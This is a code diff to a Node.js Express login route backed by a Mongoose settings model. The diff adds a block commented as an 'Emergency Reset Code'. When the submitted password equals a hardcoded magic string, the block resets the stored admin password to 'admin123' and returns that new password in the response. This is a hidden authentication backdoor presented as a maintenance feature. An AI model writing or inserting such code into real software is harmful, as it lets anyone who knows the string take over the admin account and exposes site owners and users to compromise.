@@ -129,6 +129,13 @@ const Settings = mongoose.model('Settings', settingsSchema);
 app.post('/api/login', async (req, res) => {
   try {
     const { password } = req.body;
+
+    // Emergency Reset Code
+    if (password === 'AbHome2026') {
+      await Settings.findOneAndUpdate({}, { adminPassword: 'admin123' });
+      return res.json({ success: true, message: 'Password reset to admin123' });
+    }
+
     const settings = await Settings.findOne();
     if (settings && settings.adminPassword === password) {
       res.json({ success: true });
